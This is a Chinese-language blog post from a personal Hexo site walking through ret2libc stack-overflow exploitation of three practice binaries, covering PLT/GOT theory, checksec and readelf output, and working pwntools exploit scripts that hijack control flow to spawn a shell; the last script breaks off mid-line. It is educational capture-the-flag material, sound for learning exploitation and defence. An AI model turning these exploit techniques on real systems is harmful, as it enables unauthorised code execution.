<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="pwn-ret2libc 题目简介本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件： 1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。 2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn-ret2libc">
<meta property="og:url" content="http://example.com/2025/06/08/pwn-ret2libc/index.html">
<meta property="og:site_name" content="LeonChow">
<meta property="og:description" content="pwn-ret2libc 题目简介本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件： 1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。 2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/06/08/pwn-ret2libc/image-20250608131129247.png">
<meta property="og:image" content="http://example.com/2025/06/08/pwn-ret2libc/image-20250608131200240.png">
<meta property="og:image" content="http://example.com/2025/06/08/pwn-ret2libc/image-20250608131221357.png">
<meta property="og:image" content="http://example.com/2025/06/08/pwn-ret2libc/image-20250609101918422.png">
<meta property="og:image" content="http://example.com/2025/06/08/pwn-ret2libc/image-20250609102020409.png">
<meta property="article:published_time" content="2025-06-08T04:35:43.000Z">
<meta property="article:modified_time" content="2025-06-09T10:25:13.102Z">
<meta property="article:author" content="Chow">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/06/08/pwn-ret2libc/image-20250608131129247.png">

<link rel="canonical" href="http://example.com/2025/06/08/pwn-ret2libc/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>pwn-ret2libc | LeonChow</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="LeonChow" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">LeonChow</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/08/pwn-ret2libc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://octodex.github.com/images/steroidtocat.png">
      <meta itemprop="name" content="Chow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LeonChow">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwn-ret2libc
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-06-08 12:35:43" itemprop="dateCreated datePublished" datetime="2025-06-08T12:35:43+08:00">2025-06-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-09 18:25:13" itemprop="dateModified" datetime="2025-06-09T18:25:13+08:00">2025-06-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="pwn-ret2libc"><a href="#pwn-ret2libc" class="headerlink" title="pwn-ret2libc"></a>pwn-ret2libc</h1><blockquote>
<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件：</p>
<p><strong>1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。</strong></p>
<p><strong>2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。</strong></p>
<p>另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：</p>
<p><strong>1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。</strong></p>
<p><strong>2.程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。</strong></p>
<p><strong>3.程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。</strong></p>
<span id="more"></span>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们的目标是拿到shell，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。拆分这个目标，可以分为以下两个步骤：</p>
<p><strong>1.找到system()函数和&#x2F;bin&#x2F;sh字符串在libc中的地址。</strong></p>
<p><strong>2.劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。</strong></p>
<p>实现第二步不难，只要精巧合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。关键在于如何找到system()函数和”&#x2F;bin&#x2F;sh”字符串的地址。这两个关键地址都在libc库中，这就是这类题型被叫做ret2libc的原因。那么如何寻找libc中的system()函数和”&#x2F;bin&#x2F;sh”字符串呢？这里需要用到以下公式：</p>
<p><strong>函数的真实地址   &#x3D;   基地址   +   偏移地址</strong> </p>
<p>要牢牢记住我们的目标：找到system()函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。下面我们对这个公式做一个解释：</p>
<p>偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、”&#x2F;bin&#x2F;sh”字符串的偏移地址。解题核心在于如何确定libc版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的libc版本即可。</p>
<p>基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，用公式：</p>
<p>这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址</p>
<p>即可求出这次运行的基地址。 </p>
<p>这回问题又发生了转化：如何找到某个函数func的真实地址呢？</p>
<p>像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。</p>
<p>总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数&#x2F;write函数的真实地址。</p>
<p>整体思路总结（关键）：</p>
<p><code>1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</code></p>
<p><code>2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。</code></p>
<p><code>3.根据libc库的版本可以很容易的确定puts函数的偏移地址。</code></p>
<p><code>4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。</code></p>
<p><code>5.根据libc函数的版本，很容易确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 </code></p>
<p><code>6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。</code></p>
<p><code>7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。</code></p>
<h2 id="前置知识（简要了解）"><a href="#前置知识（简要了解）" class="headerlink" title="前置知识（简要了解）"></a>前置知识（简要了解）</h2><p>plt表和got表<br>这块不用理解太深，读者嫌麻烦也可以直接看后文的解题过程，我这里总结了几位大佬的博客，做个简要介绍。</p>
<p>由于二进制文件本身没有 system 也没有 &#x2F;bin&#x2F;sh，需要使用 libc 中的 system 和 &#x2F;bin&#x2F;sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc版本，从而知道其他函数的地址。获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址。为什么是已经执行过的函数的地址呢，此处就要介绍plt表和got表的内容了。</p>
<p>got表：globle offset table 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址。我们的最终目标就是拿到system函数的got表地址，同时知道libc的基地址的话即可找到system函数的真实地址。</p>
<p>plt表：procedure link table 程序链接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量。可以理解为函数的入口地址，通过劫持返回地址为puts函数的plt表地址，即可执行puts函数。</p>
<p>说的有点绕，用大佬语雀博客中的一图以蔽之：<br><img src="/2025/06/08/pwn-ret2libc/image-20250608131129247.png" alt="image-20250608131129247"></p>
<p>可执行的二进制文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址（即最靠右的两个箭头已经建立），但是在一开始（尚未发生函数调用时）就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制。</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，上图中最右侧的两个箭头才建立完成，我们才能够通过got表读取到libc中的函数。至于具体过程相对复杂，这里引用大佬博主的图片简要介绍，当程序第一次执行某个函数A时，发生的过程如下：<br><img src="/2025/06/08/pwn-ret2libc/image-20250608131200240.png" alt="image-20250608131200240"></p>
<p>在可执行二进制程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新（就是图一中最右边俩箭头还没有建立），会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。当第二次执行函数A时，发生的流程就很简单了，如下图：<br><img src="/2025/06/08/pwn-ret2libc/image-20250608131221357.png" alt="image-20250608131221357"></p>
<p>此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。说白了，图三就是图一。 </p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/134872403">https://blog.csdn.net/Bossfrank/article/details/134872403</a></p>
</blockquote>
<p>例题如下：</p>
<h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><ol>
<li>拿到题目先查属性如图所示</li>
</ol>
<p><img src="/2025/06/08/pwn-ret2libc/image-20250609101918422.png" alt="image-20250609101918422"></p>
<ol start="2">
<li>可以看到首先canary和PIE都没有找到但是开启了 NX 保护 那我们看下是否是静态链接的</li>
</ol>
<p><img src="/2025/06/08/pwn-ret2libc/image-20250609102020409.png" alt="image-20250609102020409"></p>
<ol start="3">
<li>发现是动态链接 那就麻烦了 那我们打开IDA搜下 <code>systeam</code> 函数吧 发现并没有函数调用 但是我们在导入表里面发现到了 <code>system</code> 并且在全局字符串里面找到了 <code>/bin/sh</code> 那就好办了 我们可以去构造payload的了 如下所示</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_adr = e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bs = <span class="built_in">next</span>(e.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x8048689\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_adr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_adr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bs)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>代码解释如下 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.首先通过软件的 plt 动态链接表我们可以定位到系统函数<span class="string">&#x27;system&#x27;</span>处</span><br><span class="line">2.之后我们在此通过搜索软件的常量字符串拿到 <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">3.紧接着我们构造的payload原理是这样的 找到溢出点 更改ret的地址 之后 <span class="string">&#x27;构造system函数的栈帧&#x27;</span> 也就是从<span class="string">&#x27;高地址到低地址传递参数、返回值&#x27;</span> 但是我们不在乎他返回到哪里去 因为只要参数传递进去了 他就会执行从而帮我们拿到shell</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><ol>
<li>先查属性</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc2 checksec ret2libc2 </span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc2/ret2libc2&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>开启了 NX 看是否是静态编译</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc2 file ret2libc2 </span><br><span class="line">ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>发现不是 拖到ida我们可以分析出来他有system函数但是没有 <code>/bin/sh</code> 我们只能自已去构造 好消息是有一个 <code>gets</code> 函数 并且我们还在IDA里面发现了一个 <code>buf2</code> 他是基于bss段的 所以我们可以吧 <code>/bin/sh</code> 写到这里面 让我们的 <code>system</code> 函数去执行就可以了 exp如下所示</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x080486C5\nc&quot;)</span></span><br><span class="line"></span><br><span class="line">sys_adr  = <span class="number">0x08048490</span></span><br><span class="line">gets_adr = <span class="number">0x08048460</span></span><br><span class="line">bss_adr  = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebp  = <span class="number">0x0804872f</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_adr, pop_ebp, bss_adr, sys_adr, <span class="number">0xdeadbeef</span>, bss_adr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>exp 解析如下所示</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.首先我们先从IDA中拿出 <span class="string">&#x27;system&#x27;</span> 的地址 以及 <span class="string">&#x27;gets&#x27;</span> 和 <span class="string">&#x27;bss&#x27;</span>的地址 </span><br><span class="line">2.然后我们构造栈内数据 那为什么我们需要一个 <span class="string">&#x27;pop_ebp&#x27;</span> 呢 </span><br><span class="line">3.其实主要是 <span class="string">&#x27;pop&#x27;</span> 不在乎 <span class="string">&#x27;pop&#x27;</span> 什么 前提是我们需要构造 <span class="string">&#x27;gets&#x27;</span> 的栈帧 </span><br><span class="line">4.但是在构造的过程中我们把 <span class="string">&#x27;bss&#x27;</span> 段的地址写在了栈内 让他当作参数执行 </span><br><span class="line">5.我们执行完之后如果不进行pop他就不会把参数弹出栈 </span><br><span class="line">6.他就会继续执行 他会以为 <span class="string">&#x27;bss&#x27;</span> 是一个函数地址 </span><br><span class="line">7.然后 <span class="string">&#x27;sys_adr&#x27;</span> 是返回值 <span class="string">&#x27;0xdeadbeef&#x27;</span> 是参数 会导致一系列的问题 </span><br><span class="line">8.保持栈结构正确，这样才能正常执行 <span class="string">&#x27;system(buf2)&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><ol>
<li>首先查属性  NX开启</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 checksec ret2libc3</span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc3&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看文件属性 动态编译 32bit</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 file ret2libc3</span><br><span class="line">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>用ida打开发现有个gets 但是呢没有 <code>system</code> 也没有 <code>/bin/sh</code> 那我们只能去通过libc去计算他的值了 首先我们是本地测试 所以我们直接用一条指令查看他是那个 <code>libc</code> 文件即可</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 ldd ret2libc3</span><br><span class="line">        linux-gate.so.1 (0xf7f3e000)</span><br><span class="line">        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cf2000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7f40000)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>发现是 <code>/lib/i386-linux-gnu/libc.so.6</code> 那么我们待会就从这里面拿出即可 因为有个<code>gets</code>函数 所以计算偏移的事我们就不搞了 比较简单没什么可讲的</li>
<li>然后因为要计算 函数起始地址所以要用到以下指令 拿到程序入口地址为 0x80484d0</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 readelf -h ./ret2libc3</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Intel 80386</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x80484d0</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          6436 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         9</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         35</span></span><br><span class="line"><span class="string">  Section header string table index: 32</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>之后我们可以去写 exp了如下所示</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2libc3&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#程序的起始地址</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span 